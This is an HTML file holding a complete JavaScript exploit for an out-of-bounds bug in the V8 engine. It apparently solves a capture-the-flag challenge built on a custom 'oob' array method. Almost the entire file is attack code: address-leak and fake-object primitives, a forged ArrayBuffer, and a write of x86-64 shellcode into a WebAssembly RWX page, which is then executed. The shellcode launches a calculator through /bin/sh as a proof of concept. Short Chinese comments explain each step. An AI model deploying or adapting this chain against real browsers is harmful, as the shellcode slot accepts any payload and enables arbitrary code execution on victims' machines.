<html>
<script>
class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    d2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2d(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}
var mem = new Memory();

var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

var shellcode1=[0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x1c,0x00,0x00,0x00,0x44,0x49,0x53,0x50,0x4c,0x41,0x59,0x3d,0x3a,0x30,0x20,0x67,0x6e,0x6f,0x6d,0x65,0x2d,0x63,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05];

const wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
    0x00, 0x00, 0x41, 0x00, 0x0b
  ]);
const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
const wasm_func = wasm_instance.exports.a;

var fake_arraybuffer = [
	//map|properties
    mem.u2d(0x0),
	mem.u2d(0x0),
	//elements|length
	mem.u2d(0x0),
	mem.u2d(0x1000),
	//backingstore|0x2
	mem.u2d(0x0),
	mem.u2d(0x2),
	//padding
	mem.u2d(0x0),
	mem.u2d(0x0),
	//fake map
	mem.u2d(0x0),
	mem.u2d(0x1900042319080808),
	mem.u2d(0x00000000082003ff),
	mem.u2d(0x0),
	mem.u2d(0x0),
	mem.u2d(0x0),
	mem.u2d(0x0),
	mem.u2d(0x0)
].slice(0);

var ab = new ArrayBuffer(0x1000).slice(0);
var obj = [wasm_instance, fake_arraybuffer, ab].slice(0);
var buf = [1.1, 2.2, 3.3].slice(0);

obj_map = mem.d2u(obj.oob());	//读取map
buf_map = mem.d2u(buf.oob());
console.log("obj_map addr: 0x" + obj_map.toString(16))
console.log("buf_map addr: 0x" + buf_map.toString(16))

obj.oob(mem.u2d(buf_map));		//将obj数组的map改为double map

wasm_inst_addr = mem.d2u(obj[0]) - 1;	//读取wasm_instance的地址
rwx_area_addr = wasm_inst_addr + 0x88	//获取rwx地址的存放地址

fake_ab_addr = mem.d2u(obj[1]) - 1;		//读取fake_arraybuffer的地址
fake_obj_addr = fake_ab_addr - 0x80;	//获取fake_arraybuffer的elements的地址
fake_obj_map = fake_ab_addr - 0x40;		//获取伪造的map地址

console.log("fake_ab_addr: 0x" + fake_ab_addr.toString(16));
console.log("rwx_area_addr: 0x" + rwx_area_addr.toString(16));

fake_arraybuffer[0] = mem.u2d(fake_obj_map + 1);	//将伪造的map填入
fake_arraybuffer[4] = mem.u2d(rwx_area_addr);		//将rwx地址的存放地址填入backingStore

obj[2] = mem.u2d(fake_obj_addr + 1);	//将elements地址写入obj数组
obj.oob(mem.u2d(obj_map));				//恢复obj数组的map

fake_obj = new DataView(obj[2]);		//将伪造的ArrayBuffer取出
rwx_area = mem.d2u(fake_obj.getFloat64(0, true));
console.log("rwx_area: 0x" + rwx_area.toString(16));	//读取rwx空间的地址

fake_arraybuffer[4] = mem.u2d(rwx_area);

for (i = 0; i < shellcode.length; i++){
    fake_obj.setUint32(i * 4, shellcode[i], true);
}

wasm_func();
</script>
</html>
